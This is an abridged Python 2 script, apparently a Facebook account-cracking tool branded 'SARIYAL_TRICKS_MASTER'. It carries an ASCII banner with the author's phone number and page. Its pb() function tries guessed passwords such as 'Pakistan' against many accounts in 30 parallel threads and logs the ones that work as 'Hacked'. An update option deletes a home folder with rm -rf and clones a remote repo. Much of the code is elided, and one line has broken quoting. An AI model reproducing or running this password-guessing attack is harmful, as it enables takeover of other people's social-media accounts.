...
logo='''
\033[1;94m ┈┈┈┈╱▔▔▔▔╲┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈╱▔▔▔▔╲┈┈┈┈
\033[1;94m ┈┈┈▕▕ JUTT ▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕  |JUTT ▏┈┈┈
\033[1;94m ┈┈┈▕▕▂╱╲▂▏▏┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈▕▕▂╱╲▂▏▏┈┈┈
\033[1;94m ┈┈┈┈╲┊┊┊┊╱┈┈┈┈\033[1;94mSariyalTricksMaster.\033[1;91m┈┈┈┈╲┊┊┊┊╱┈┈┈┈
\033[1;96m ┈┈┈┈▕╲▂▂╱▏┈┈┈┈☞☞☞☞☞☞\033[1;91m☜☜☜☜☜┈┈┈┈▕╲▂▂╱▏┈┈┈┈
\033[1;96m ╱▔▔▔▔┊┊┊┊▔▔▔▔╲☞☞☞☞☞☞\033[1;91m☜☜☜☜☜╱▔▔▔▔┊┊┊┊▔▔▔▔╲
\033[1;96m................\033[1;93mSariyalTricksMaster\033[1;91m...............
\033[1;96m................\033[1;93m✬🄵🄰🄲🄴🄱🄾🄾🄺✬\033[1;91m..............

\033[1;96m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░

\033[1;91m☞ Auther     : SARIYAL_TRICKS_MASTER
\033[1;92m☞ WhatsApp   : 03124887939
\033[1;95m☞ Facebook    : https://www.facebook.com/S4R1Y4L/
...
def login():
	...
	try:
		...
		if 'access_token' in z:
		    ...
		    os.system('xdg-open https://www.facebook.com/S4R1Y4L/') 
		    menu()
		else:
...
def menu():
	...
	print (S + '[' + P + '☞2' + S + ']' + S + ' Update SARIYAL_TRICKS_MASTER ')
	print (S + '[' + P + '☞3' + S + ']' + S + ' SARIYAL_TRICKS_MASTER Facebook Page')
...
def mb():
	...
	if bm =='':
	    ...
	    os.system('rm -rf $HOME/Sariyal-Jutt')
	    os.system('cd $HOME && git clone 'https://github.com/SariyalJutt)
	    cb()
	    print (logo)
	    psb('☆10%')
	    psb('☆☆20%')
	    ...
	    psb('WhatsApp Num 03124887939✓')
	    psb('WellCome To SARIYAL_TRICKS_MASTER')
	    psb('Congratulations SARIYAL_TRICKS_MASTER Tool Has Been Updated Successfully')
	    psb('🔓User Name☆ SARIYAL✓')
	    psb('🔓Password ☆ WALEED✓')
	    psb('Like My Facebook Page SARIYAL TRICKS MASTER✓')
	    psb('Please Login Again')
	    time.sleep(2)
	    os.system('cd $SARIY/TRICKS/MASTER && python2 sariyal.py')
	elif bm =='3':
	    os.system('xdg-open https://www.facebook.com/S4R1Y4L/')
	    menu()
	elif bm =='4':
...
def pb():
			...
			if 'www.facebook.com' in k['error_msg']:
			    ...
			    if 'access_token' in k:
			        ...
			        if 'www.facebook.com' in k['error_msg']:
			            ...
			            if 'access_token' in k:
			                print(G+'[SariyalHackec] ♡ '+user+' ♡ '+ps2)
			                oks.append(user+ps2)
			            else:
			                ...
			                if 'www.facebook.com' in k['error_msg']:
			                    ...
			                    if 'access_token' in k:
			                        ...
			                        if 'www.facebook.com' in k['error_msg']:
			                            ...
			                            if 'access_token' in k:
			                                print(G+'[SariyalHackec] ♡ '+user+' ♡ '+ps4)
			                                oks.append(user+ps4)
			                            else:
			                                ps5=('Pakistan')
			                                ...
			                                if 'www.facebook.com' in k['error_msg']:
			                                    ...
			                                    if 'access_token' in k:
			                                        print(G+'[SariyalHacked] ♡ '+user+' ♡ '+ps5)
			                                        oks.append(user+ps5)
			                                    else:
			                                        ...
			                                        if 'www.facebook.com' in k['error_msg']:
			                                            ...
			                                            if 'access_token' in k:
			                                                print(G+'[SariyalHacked] ♡ '+user+' ♡ '+ps6)
			                                                oks.append(user+ps6)
		except:
			pass
	p=ThreadPool(30)
	...
	print(Y+'Total '+G+'OK'+S+'/'+P+'CP'+S+' = '+G+str(len(SariyalHacked))+S+'/'+R+str(len(cps)))
	print(S+'Sariyal Tricks Master ')     
	print
	raw_input(R + 'Back')
	os.system('python2 sariyal.py')
